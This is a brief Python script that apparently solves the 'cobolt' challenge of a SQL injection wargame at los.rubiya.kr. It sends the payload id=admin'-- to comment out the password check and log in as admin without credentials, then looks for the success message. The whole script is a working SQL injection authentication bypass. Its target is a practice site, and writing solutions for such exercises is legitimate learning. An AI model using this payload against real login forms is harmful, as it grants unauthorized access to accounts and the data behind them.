import requests

url = 'https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php'
cookie = {'PHPSESSID': 'your cookie'}
payload = "?id=admin'-- "

r = requests.get(url + payload, cookies=cookie)
if 'COBOLT Clear!' in r.text:
    print('COBOLT Clear!')
